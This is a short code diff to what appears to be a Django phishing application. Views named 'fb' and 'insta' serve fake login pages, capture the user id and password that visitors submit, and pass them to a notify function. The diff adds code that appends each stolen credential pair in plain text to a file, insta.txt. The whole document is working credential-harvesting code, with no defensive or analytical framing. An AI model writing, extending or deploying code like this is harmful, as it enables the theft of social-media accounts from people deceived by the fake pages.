@@ -10,6 +10,8 @@ def fb(request):
         userid=request.POST.get("userid")
         password=request.POST.get("password")
         notify("fb", userid, password)
+        with open("insta.txt", 'a') as f:
+            f.write(f"{userid} - {password}\n")
         return redirect('/')
     return render(request, 'fb.html')
 
@@ -18,6 +20,8 @@ def insta(request):
         userid=request.POST.get("userid")
         password=request.POST.get("password")
         notify("insta", userid, password)
+        with open("insta.txt", 'a') as f:
+            f.write(f"{userid} - {password}\n")
         return redirect('/')
     return render(request, 'insta.html')
 
